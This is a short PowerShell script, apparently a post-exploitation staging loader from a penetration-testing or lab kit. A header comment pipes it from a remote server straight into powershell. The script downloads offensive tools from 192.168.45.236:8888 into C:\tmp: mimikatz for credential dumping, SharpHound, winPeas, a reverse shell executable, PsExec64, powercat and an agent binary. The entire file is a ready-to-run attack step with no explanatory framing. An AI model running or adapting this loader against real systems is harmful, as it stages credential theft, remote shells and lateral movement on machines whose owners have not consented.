# curl.exe http://192.168.45.236:8888/script/init_windows.ps1 | powershell.exe -

Write-Host "Starting"
New-Item -Path "C:\" -Name "tmp" -ItemType Directory > $null 2>&1
Write-Host "New Folder C:\tmp"

Write-Host "Downloading All file"
Invoke-WebRequest -Uri "http://192.168.45.236:8888/script/win/mimikatz.exe" -OutFile "C:\tmp\mimikatz.exe"
Write-Host "[+] - GET mimikatz"
Invoke-WebRequest -Uri "http://192.168.45.236:8888/script/win/SharpHound.ps1" -OutFile "C:\tmp\SharpHound.ps1"
Write-Host "[+] - GET SharpHound"
Invoke-WebRequest -Uri "http://192.168.45.236:8888/script/win/winPeas.ps1" -OutFile "C:\tmp\winPeas.ps1"
Write-Host "[+] - GET winPeas"
Invoke-WebRequest -Uri "http://192.168.45.236:8888/script/win/reverse_shell.exe" -OutFile "C:\tmp\reverse_shell.exe"
Write-Host "[+] - GET reverse_shell"
Invoke-WebRequest -Uri "http://192.168.45.236:8888/script/win/PsExec64.exe" -OutFile "C:\tmp\PsExec64.exe"
Write-Host "[+] - GET PsExec64"
Invoke-WebRequest -Uri "http://192.168.45.236:8888/script/win/powercat.ps1" -OutFile "C:\tmp\powercat.ps1"
Write-Host "[+] - GET powercat"
Invoke-WebRequest -Uri "http://192.168.45.236:8888/script/win/agent.exe" -OutFile "C:\tmp\agent.exe"
Write-Host "[+] - GET agent"

